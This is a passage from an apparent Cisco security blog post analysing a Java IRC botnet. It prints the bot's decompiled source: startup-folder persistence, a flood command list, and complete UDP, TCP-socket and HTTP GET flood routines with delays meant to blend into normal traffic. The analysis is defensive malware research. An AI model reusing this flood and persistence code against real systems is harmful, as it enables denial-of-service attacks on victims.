+            <span class="o">{</span>
+
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+            <span class="o">}</span>
+
+            <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">exception</span><span class="o">)</span> <span class="o">{</span> <span class="o">}</span>
+
+
+
+    <span class="o">}</span>
+
+
+
+</pre>
+</div>
+</div>
+<p>You can see the code to add the <font color="red">bot</font> into the registry with the cmd.exe command. You will also notice above that the author mentions an older, &#8220;no longer needed&#8221; method. Let&#8217;s take a look at that as well. </p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+
+
+    <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">find<font color="red">Startup</font></span><span class="o">()</span>
+
+
+
+    <span class="o">{</span>
+
+        <span class="k">if</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"xp"</span><span class="o">))</span>
+
+
+
+            <span class="k">return</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"user.home"</span><span class="o">)))).</span><span class="na">append</span><span class="o">(</span><span class="s">"\\Start Menu\\Programs\\Startup\\"</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">();</span>
+
+
+
+        <span class="k">else</span>
+
+            <span class="nf">return</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"user.home"</span><span class="o">)))).</span><span class="na">append</span><span class="o">(</span><span class="s">"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\<font color="red">Startup</font>\\"</span><span class="o">).</span><span class="na"><font color="red">toString</font></span><span class="o">();</span>
+
+
+
+    <span class="o">}</span>
+
+</pre>
+</div>
+</div>
+<p>This is a very rudimentary and obvious method not often seen anymore. Basically, the <font color="red">malware</font> copies itself into the Windows start up folder. It seems like the author intended the program to load once Windows loads. The strange thing here is that the file deletes itself right after the copy. It&#8217;s likely another bug or the author&#8217;s strange way of deprecating the method.</p>
+<p>Removing something from the registry can be a daunting task for an inexperienced computer user. Using a registry key to ensure the <font color="red">malware</font> is loaded at boot is the most popular method to ensure <font color="red">malware</font> maintains control of the machine.</p>
+<p>In addition to registry manipulations to maintain a presence on the host, the <font color="red">bot</font> also supports a number of flood <font color="red">functions</font> in its arsenal. In basic terms, a flood is sending the computer more requests than its bandwidth allows or more requests than it can process. Note that I&#8217;m using the word &#8220;request&#8221; here in a very open sense; it can apply to any protocol.</p>
+<p>From a single machine, floods are relatively easy to stop. You can simply block or rate limit the <font color="red">IP</font> address. This is what&#8217;s commonly referred to as a denial of service (DoS) <font color="red">attack</font>. The problem becomes much more complex when the <font color="red">attack</font> utilizes random <font color="red">IP</font> addresses originating from all across the Internet. This is what is known as a distributed denial of service (<font color="red">DDoS</font>) <font color="red">attack</font>. The ability to conduct <font color="red">DDoS</font> <font color="red">attacks</font> has historically been the primary offensive <font color="red">capability</font> of most <font color="red">botnets</font>. This allows <font color="red">botmasters</font> to extort <font color="red">network</font> availability from victim sites or to launch <font color="red">attacks</font> for other reasons. </p>
+<p>Here is a brief list of the <font color="red">functions</font> we will cover. Does anyone see a potential oddity in the chunk of code below given what we know about the <font color="red">bot</font>&#8217;s command syntax?</p>
+<div class="scrollable" style="overflow: auto;height: 120px;width: auto">
+<div class="highlight">
+<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$sockFlood&quot;</span><span class="o">))</span><br />
+<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;stopSockFlood&quot;</span><span class="o">))</span><br />
+<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$udpFlood&quot;</span><span class="o">))</span><br />
+<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$stopUdp&quot;</span><span class="o">))</span><br />
+<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$httpf&quot;</span><span class="o">))</span> <span class="o">{</span><br />
+<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$stopFloods&quot;</span><span class="o">))</span> <span class="o">{</span>
+</div>
+</div>
+<p>The UDP flood class simply sends <font color="red">packets</font> to a random port until it reaches the number of <font color="red">packets</font> specified by the <font color="red">botmaster</font>. You&#8217;ll notice the <font color="red">function</font> allows for a delay, which can be specified by the <font color="red">botmaster</font>. Constant floods are extremely easy to spot so by adding a delay the <font color="red">botmaster</font> is attempting to hide his legion of <font color="red">bots</font> amongst <font color="red">normal traffic</font>. </p>
+<div class="scrollable">
+<div class="highlight">
+<pre>	
+
+	<span class="k">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span>
+
+    <span class="o">{</span>
+
+        <span class="k">while</span><span class="o">(</span><span class="n">udpFlooding</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="n">connections</span> <span class="o">||</span> <span class="n">connections</span> <span class="o">==</span> <span class="mi">0</span><span class="o">))</span> 
+
+        <span class="o">{</span>
+
+
+
+            <span class="k">try</span>
+
+            <span class="o">{</span>
+
+                <span class="kt"><font color="red">byte</font></span> <span class="n">buffer</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="kt"><font color="red">byte</font></span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
+
+
+
+                <span class="n">DatagramPacket</span> <span class="n"><font color="red">packet</font></span> <span class="o">=</span> <span class="k">new</span> <span class="n">DatagramPacket</span><span class="o">(</span><span class="n">buffer</span><span class="o">,</span> <span class="n">buffer</span><span class="o">.</span><span class="na">length</span><span class="o">,</span> <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="n">host</span><span class="o">),</span> <span class="n">Misc</span><span class="o">.</span><span class="na">randomNumber</span><span class="o">(</span><span class="mi">65535</span><span class="o">));</span>
+
+
+
+                <span class="n">DatagramSocket</span> <span class="n"><font color="red">socket</font></span> <span class="o">=</span> <span class="k">new</span> <span class="n">DatagramSocket</span><span class="o">();</span>
+
+                <span class="n">socket</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n"><font color="red">packet</font></span><span class="o">);</span>
+
+
+
+                <span class="n">count</span><span class="o">++;</span>
+
+                <span class="k">if</span><span class="o">(</span><span class="n">delay</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span>
+
+                    <span class="n">sleep</span><span class="o">(</span><span class="n">delay</span><span class="o">);</span>
+
+
+
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+            	
+
+            <span class="o">}</span>
+
+        <span class="o">}</span>
+
+
+
+		<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">"Flooding finished!"</span><span class="o">);</span>
+
+		<span class="n">stop</span><span class="o">();</span>
+
+
+
+    <span class="o">}</span>
+
+</pre>
+</div>
+</div>
+<p>Likewise, the SocketFlooder class calls the <font color="red">socket</font> method to open a series of connections to a specific TCP port. This type of <font color="red">attack</font> is very similar to the popular synflood, but not identical. A synflood simply sends a syn <font color="red">packet</font>, which normally is the first <font color="red">packet</font> sent to establish a TCP <font color="red">session</font>, and then ignores the rest of the <font color="red">session</font>. The key difference here is that this flood actually establishes a connection. The end result of this <font color="red">attack</font> is that it ends up using even more resources. </p>
+<div class="scrollable">
+<div class="highlight">
+<pre>	
+
+	<span class="k">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> 
+
+	<span class="o">{</span>
+
+		<span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">times</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+
+
+
+			<span class="k">try</span> <span class="o">{</span>
+
+				<span class="k">if</span><span class="o">(!</span><span class="n">flooding</span><span class="o">)</span> <span class="o">{</span>
+
+					<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">"Flooding finished"</span><span class="o">);</span>
+
+
+
+					<span class="k">return</span><span class="o">;</span>
+
+				<span class="o">}</span>
+
+				<span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">"unused"</span><span class="o">)</span>
+
+				<span class="n"><font color="red">Socket</font></span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n"><font color="red">Socket</font></span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+
+
+
+				<span class="n">flooding</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+
+			<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">UnknownHostException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+				<span class="c">// TODO Auto-generated catch block</span>
+
+				<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+			<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+				<span class="c">// TODO Auto-generated catch block</span>
+
+				<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+			<span class="o">}</span>
+
+			<span class="k">try</span> <span class="o">{</span>
+
+
+
+				<span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">delay</span><span class="o">);</span>
+
+			<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+				<span class="c">// TODO Auto-generated catch block</span>
+
+				<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+			<span class="o">}</span>
+
+		<span class="o">}</span>
+
+		<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">"Flooding finished!"</span><span class="o">);</span>
+
+
+
+		<span class="n">stop</span><span class="o">();</span>
+
+	<span class="o">}</span>
+
+	<span class="k">private</span> <span class="n">String</span> <span class="n">url</span><span class="o">;</span>
+
+	<span class="k">private</span> <span class="kt">int</span> <span class="n">port</span><span class="o">;</span>
+
+	<span class="k">private</span> <span class="kt">int</span> <span class="n">times</span><span class="o">;</span>
+
+	<span class="k">private</span> <span class="kt">int</span> <span class="n">delay</span><span class="o">;</span>
+
+	<span class="k">public</span> <span class="k">static</span> <span class="kt">boolean</span> <span class="n">flooding</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+
+
+
+<span class="o">}</span>
+
+
+
+</pre>
+</div>
+</div>
+<p>You&#8217;ll notice that the <font color="red">botmaster</font> has variables declared to set up a delay in this <font color="red">function</font> as well. This is very likely due to the fact that the industry as a whole has become extremely adept at detecting synfloods. By adding a slight random delay between each request, the traffic has the potential to look more like <font color="red">normal traffic</font>. </p>
+<p>The <font color="red">bot</font> also supports an <font color="red">HTTP</font> flood engine. This is similar to the <font color="red">socket</font> flooder, only the <font color="red">bot</font> actually establishes an <font color="red">HTTP</font> connection to a <font color="red">server</font> and performs a GET on the specified URL. This is a much more effective DoS technique since it requires the <font color="red">server</font> to do more work and since it is harder to differentiate between an <font color="red">attack</font> and the normal <font color="red">network</font> traffic handled by the host. Protocols like <font color="red">HTTP</font> that are designed to serve anyone are much more susceptible to <font color="red">DDoS</font> <font color="red">attacks</font> since the <font color="red">servers</font> regularly receive requests from random <font color="red">IP</font> addresses. </p>
+<div class="scrollable">
+<div class="highlight">
+<pre>	
+
+
+
+<span class="k">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> 
+
+	<span class="o">{</span>
+
+
+
+		<span class="k">while</span><span class="o">(</span><span class="n">httpFlooding</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">count</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">connections</span> <span class="o">||</span> <span class="k">this</span><span class="o">.</span><span class="na">connections</span> <span class="o">==</span> <span class="mi">0</span><span class="o">))</span> 
+
+		<span class="o">{</span>
+
+
+
+			<span class="k">try</span> 
+
+			<span class="o">{</span>
+
+				<span class="n">HttpURLConnection</span><span class="o">.</span><span class="na">setFollowRedirects</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+
+				<span class="n">HttpURLConnection</span> <span class="n">conn</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpURLConnection</span><span class="o">)(</span><span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">url</span><span class="o">)).</span><span class="na">openConnection</span><span class="o">();</span>
+
+
+
+				<span class="n">conn</span><span class="o">.</span><span class="na">setRequestMethod</span><span class="o">(</span><span class="s">"GET"</span><span class="o">);</span>
+
+				<span class="n">conn</span><span class="o">.</span><span class="na">getResponseCode</span><span class="o">();</span>
+
+				<span class="n">conn</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+
+
+				<span class="n">count</span><span class="o">++;</span>
+
+			<span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+			<span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+
+
+
+				<span class="k">try</span> <span class="o">{</span>
+
+					<span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">delay</span><span class="o">);</span>
+
+				<span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">InterruptedException</span> <span class="n">ie</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+				<span class="o">}</span>
+
+			<span class="o">}</span>
+
+		<span class="o">}</span>
+
+		<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">"Flooding finished!"</span><span class="o">);</span>
+
+
+
+		<span class="n">stop</span><span class="o">();</span>
+
+	<span class="o">}</span>
+
+
+
+
+
+</pre>
+</div>
+</div>
+<p>In the last post of this series we will look into a few of the more interesting features this <font color="red">bot</font> supports that previously I&#8217;ve only seen in much more complex <font color="red">bots</font>. It&#8217;s quite startling how quickly features that were brand new a year ago have already progressed into simple <font color="red">malware</font> such as this.</p>
+<style type="text/css">
+div.scrollable  {
+    overflow: auto;
+    <font color="red">height</font>: 300px;
+    <font color="red">width</font>: auto;
+}
+td.linenos { background-color: #f0f0f0; padding-right: 10px; }
+span.lineno { background-color: #f0f0f0; padding: 0 5px 0 5px; }</p>
+<p>/* For Pygmentized text */
+body  { background: #f8f8f8; }
+body .c { color: #408080; font-style: italic } /* Comment */
+body .err { border: 1px solid #FF0000 } /* Error */
+body .k { color: #008000; font-weight: bold } /* Keyword */
+body .o { color: #666666 } /* Operator */
+body .cm { color: #408080; font-style: italic } /* Comment.Multiline */
+body .cp { color: #BC7A00 } /* Comment.Preproc */
+body .c1 { color: #408080; font-style: italic } /* Comment.Single */
+body .cs { color: #408080; font-style: italic } /* Comment.Special */
+body .gd { color: #A00000 } /* Generic.Deleted */
+body .ge { font-style: italic } /* Generic.Emph */
+body .gr { color: #FF0000 } /* Generic.Error */
+body .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+body .gi { color: #00A000 } /* Generic.Inserted */
+body .go { color: #808080 } /* Generic.Output */
+body .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+body .gs { font-weight: bold } /* Generic.Strong */
+body .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+body .gt { color: #0040D0 } /* Generic.Traceback */
+body .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+body .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+body .kp { color: #008000 } /* Keyword.Pseudo */
+body .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+body .kt { color: #B00040 } /* Keyword.Type */
+body .m { color: #666666 } /* Literal.Number */
+body .s { color: #BA2121 } /* Literal.String */
+body .na { color: #7D9029 } /* Name.Attribute */
+body .nb { color: #008000 } /* Name.Builtin */
+body .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+body .no { color: #880000 } /* Name.Constant */
+body .nd { color: #AA22FF } /* Name.Decorator */
+body .ni { color: #999999; font-weight: bold } /* Name.Entity */
+body .ne { color: #D2413A; font-weight: bold } /* Name.Exception */
+body .nf { color: #0000FF } /* Name.Function */
+body .nl { color: #A0A000 } /* Name.Label */
+body .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+body .nt { color: #008000; font-weight: bold } /* Name.Tag */
+body .nv { color: #19177C } /* Name.Variable */
+body .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+body .w { color: #bbbbbb } /* Text.Whitespace */
+body .mf { color: #666666 } /* Literal.Number.Float */
+body .mh { color: #666666 } /* Literal.Number.Hex */
+body .mi { color: #666666 } /* Literal.Number.Integer */
+body .mo { color: #666666 } /* Literal.Number.Oct */
+body .sb { color: #BA2121 } /* Literal.String.Backtick */
+body .sc { color: #BA2121 } /* Literal.String.Char */
+body .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+body .s2 { color: #BA2121 } /* Literal.String.Double */
+body .se { color: #BB6622; font-weight: bold } /* Literal.String.Escape */
+body .sh { color: #BA2121 } /* Literal.String.Heredoc */
+body .si { color: #BB6688; font-weight: bold } /* Literal.String.Interpol */
+body .sx { color: #008000 } /* Literal.String.Other */
+body .sr { color: #BB6688 } /* Literal.String.Regex */
+body .s1 { color: #BA2121 } /* Literal.String.Single */
+body .ss { color: #19177C } /* Literal.String.Symbol */
+body .bp { color: #008000 } /* Name.Builtin.Pseudo */
+body .vc { color: #19177C } /* Name.Variable.Class */
+body .vg { color: #19177C } /* Name.Variable.Global */
+body .vi { color: #19177C } /* Name.Variable.Instance */
+body .il { color: #666666 } /* Literal.Number.Integer.Long */
+   </style>
+Tags:<br /><ul class = "tagged"><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=botnet">botnet</a></li><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=java">java</a></li><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=malware">malware</a></li><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=security-2">security</a></li><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=security-research">security research</a></li></ul>		</div>
+			<div id = "comments">
+				<div id = "respond">
+				<p class = "cisco_respond">In an effort to keep conversations fresh, Cisco Blogs closes comments after 60 days. Please visit the <a href ="https://blogs.cisco.com">Cisco Blogs hub page</a> for the latest content.</p>
+		</div>
+
+			</div>
+		</article>
+
+	</div>
+	<div id = "main_right">
+		<ul id = "sidebar">
+
+  <li id="subscribe" class="widget">
+    <h3>Subscribe to Security:</h3>
+    <div id="subscribe_box">
+      <form id ="subscribe_form" action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open('https://feedburner.google.com/fb/a/mailverify?uri=CiscoBlogSecurity', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true">
+        <input type="text" class="subscribe" name="email" value="Enter email address" onFocus="if(this.value == 'Enter email address') {this.value = '';}" onBlur="if (this.value == '') {this.value = 'Enter email address';}"></input>
+        <input type="hidden" value="CiscoBlogSecurity" name="uri" ></input>
+        <input type="hidden" name="loc" value="en_US"></input>
+        <input type="submit" class="subscribe_button" value="Subscribe" ></input>
+        <div class="clear"></div>
+      </form>
+    </div>
+    <div class="clear"></div>
+
+</li>
+
+<li id="social_widget" class="widget">
+  <h3>Connect with Security</h3>
+  <ul>
+        <li><a target='_blank' href="https://www.facebook.com/ciscosecurity?ref=nf"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_fb.png" alt="Facebook"></a></li>
+    <li><a target='_blank' href="https://twitter.com/ciscosecurity"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_tw.png" alt="Twitter"></a></li>
+    <li><a target='_blank' href="http://www.linkedin.com/company/cisco"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_li.png" alt="Linkedin"></a></li>
+    <li><a target='_blank' href="https://plus.google.com/106092229730683979920"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_gp.png" alt="Google+"></a></li>
+    <li><a target='_blank' href="https://www.slideshare.net/ciscosystems"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_ss.png" alt="Slideshare"></a></li>
+    <li><a target='_blank' href="http://youtubecisco.com/security"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_yt.png" alt="YouTube"></a></li>
+    <li><a target='_blank' href="https://www.instagram.com/cisco/?hl=en"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_ig.png" alt="Instagram"></a></li>
+    <li><a href="https://feeds.feedburner.com/CiscoBlogSecurity"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/rss.png" width = "24" height = "24" alt = "Rss"></a></li>
+      </ul>
+</li>
+	<li>
+		<div id = "nitroLoggedOut" class="widget">
+			<div class = "consoleTitle">
+				Cisco Social Rewards
+			</div>
+			<div class = "consoleTextNoLog">
+				Get credit for all your Cisco site participation with Social Rewards. <a href = "https://blogs.cisco.com/rewards-about">Learn More</a>			</div>
+						<a href = "https://socialrewards-prod.cloudapps.cisco.com/" class = "joinNow">Join Today</a>
+			<div class = "consoleTextNoLog">
+				Already a member?  <a href = "https://socialrewards-prod.cloudapps.cisco.com/" class = "already">Log In</a>
+			</div>
+			</div>
+</li> 	<script>
+
+
+	nitro.callAPI("method=site.getActionFeed&apiKey=6912c6c82ccc4863a0311dc8b586b8fb&showLevelChanges=true&preferences=userFullName|profileUrl|userPhotoUrl", "newsfeed");
+	</script>
+	<li>
+		 <div id ="newsfeedWidget">
+			<div class = "newsfeed_header">
+				Latest Rewards
+				<a href = "https://blogs.cisco.com/rewards-about" class = "newsIcon"><img src = "/wp-content/plugins/bunchball/images/infoIcon.png"></a>
+			</div>
+			<div id = "newsInnerContent">
+				<ul id = "newsfeed">
+				</ul>
+			</div>
+		</div>
+	</li>
+    <li id="blogroll">
+            <ul id="blogroll_links">
+          <li class="roll_heading">What We're Reading</li>
+
+            <li><a href="http://www.cert.org/blogs/vuls/" target="_blank">CERT Vulnerability Analysis</a></li>
+                      <li><a href="http://blogs.technet.com/b/srd/" target="_blank">Microsoft Security Research & Defense</a></li>
+                      <li><a href="http://isc.sans.edu/index.html" target="_blank">SANS Internet Storm Center</a></li>
+                      <li><a href="http://www.schneier.com/" target="_blank">Schneier on Security</a></li>
+                  </ul>
+              <ul id="related_links">
+          <li class="roll_heading">Related Links</li>
+                    <li><a href="http://www.cisco.com/en/US/products/products_security_advisories_listing.html" target="_blank">Advisories and Responses</a></li>
+                        <li><a href="http://tools.cisco.com/security/center/cyberRiskReport.x" target="_blank">Cyber Risk Reports</a></li>
+                        <li><a href="http://tools.cisco.com/security/center/intelliPapers.x?i=55" target="_blank">Security Best Practices</a></li>
+                        <li><a href="http://tools.cisco.com/security/center/home.x" target="_blank">Security Intelligence Operations</a></li>
+                        <li><a href="http://www.cisco.com/en/US/products/hw/vpndevc/index.html" target="_blank">Security Products</a></li>
+                  </ul>
+          </li>
+  </ul>	</div>
+	<div class = "clear"></div>
+</div>
+</div>
+</div>
+   
+
+<div class="sb-slidebar sb-left sb-width-custom sb-momentum-scrolling " data-sb-width="50%">
+    <nav>
+  <a class = "hamburger_login" href = "https://blogs.cisco.com:9031/sp/startSSO.ping?PartnerIdpId=cloudsso.cisco.com">Log In to Cisco.com</a>      <ul>
+                  <li><a href='https://blogs.cisco.com'><span>All Blogs</span></a></li>
+                  <li><a href='#'><span>Technologies</span></a>
+                  <ul>
+            <div class = "bordertop"></div>
+            <li><a href="https://blogs.cisco.com/analytics-automation">Analytics &amp; Automation</a></li>
+            <li><a href="https://blogs.cisco.com/cloud">Cloud</a></li>
+            <li><a href='https://blogs.cisco.com/collaboration'>Collaboration</a></li>
+            <li><a href='https://blogs.cisco.com/datacenter'>Data Center</a></li>
+            <li><a href='https://blogs.cisco.com/digital'>Digital Transformation</a></li>
+            <li><a href='https://blogs.cisco.com/enterprise'>Enterprise Networks</a></li>
+            <li><a href='https://blogs.cisco.com/innovation'>Innovation</a></li>
+            <li><a href='https://blogs.cisco.com/wireless'>Mobility</a></li>
+            <li><a href='https://blogs.cisco.com/security'>Security</a></li>
+            <li class = "sub"><a href="https://blogs.cisco.com/talos" class="nav_menu" title="">Threat Research</a></li>
+            <li><a href='https://blogs.cisco.com/smallbusiness'>Small Business</a></li>
+            <li><a href='https://blogs.cisco.com/services'>Services</a></li>
+            <li><a href='https://blogs.cisco.com/sp'>SP360:Service Provider</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Industries</span></a>
+                      <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/education'>Education</a></li>
+            <li><a href='https://blogs.cisco.com/energy'>Energy</a></li>
+            <li><a href='https://blogs.cisco.com/financialservices'>Financial Services</a></li>
+            <li><a href='https://blogs.cisco.com/government'>Government</a></li>
+            <li><a href='https://blogs.cisco.com/healthcare'>Healthcare</a></li>
+            <li><a href='https://blogs.cisco.com/manufacturing'>Manufacturing</a></li>
+            <li><a href='https://blogs.cisco.com/retail'>Retail &amp; Hospitality</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Partners</span></a> 
+          <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/partner'>Partner</a></li>
+          </ul>
+        </li>
+        <li><a href='#'><span>For the Tech Expert</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/getyourbuildon'>Architects &amp; Distinguished Engineers</a></li>
+            <li><a href='https://blogs.cisco.com/developer'>Developer</a></li>
+            <li><a href='https://blogs.cisco.com/performance'>High Performance Computing</a></li>
+            <li><a href='https://blogs.cisco.com/ciscoit'>Inside Cisco IT</a></li>
+            <li><a href='https://blogs.cisco.com/cin'>TechWiseTV</a></li>
+          </ul>
+        </li>
+         <li><a href='#'><span>Get to Know Cisco</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/csr'>Corporate Social Responsibility</a></li>
+            <li><a href='https://blogs.cisco.com/cle'>Connected Life Exchange</a></li>
+            <li><a href='https://blogs.cisco.com/customerstories'>Customer Stories</a></li>
+            <li><a href='https://blogs.cisco.com/socialmedia'>Digital and Social Media</a></li>
+            <li><a href='https://blogs.cisco.com/gov'>High Tech Policy</a></li>
+            <li><a href='https://blogs.cisco.com/diversity'>Inclusion and Diversity</a></li>
+            <li><a href='https://blogs.cisco.com/lifeatcisco'>Life at Cisco</a></li>
+            <li><a href='https://blogs.cisco.com/perspectives'>Perspectives</a></li>
+            <li><a href='https://blogs.cisco.com/news'>Executive Platform: News &amp; Insights</a></li>
+          </ul>
+        </li>
+        <li class = "countries"><a href='#'><span>Countries and Regions</span></a>
+          <ul>
+            <div class = "col_1">
+  <li><a href="https://apjc.thecisconetwork.com/">Asia Pacific</a>
+  <li><a href="https://gblogs.cisco.com/at/">Austria</a>
+  <li><span class = "sub_main">Belgium</span></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be">Dutch</a></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be-fr">French</a></li>
+  <li><a href="https://gblogs.cisco.com/br/">Brazil</a>
+  <li><span class = "sub_main">Canada</span></li>
+    <li class = "sub"><a href="https://canadablog.cisco.com/">English</a></li>
+    <li class = "sub"><a href="https://ciscocanadafr.wordpress.com/">French</a></li>
+
+  </div>
+    <div class = "col_2">
+    <li><a href="https://gblogs.cisco.com/fin/">Finland</a>
+    <li><a href="https://gblogs.cisco.com/fr/">France</a>
+
+  <li><a href="https://gblogs.cisco.com/de">Germany</a></li>
+  <li><a href="https://gblogs.cisco.com/gr/">Greece</a>
+  <li><a href="https://gblogs.cisco.com/in">India</a></li>
+  <li><a href="https://gblogs.cisco.com/it/">Italy</a></li>
+  <li><a href="https://gblogs.cisco.com/jp/">Japan</a></li>
+  <li><a href="https://ciscokrblog.com/">Korea</a></li>
+
+  </div>
+  <div class = "col_3">
+  <li><span class = "sub_main">Latin America</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/la/">Latin America (Esp)</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/cansac/">Cansac</a></li>
+  <li><a href="https://gblogs.cisco.com/nl/">Netherlands</a></li>
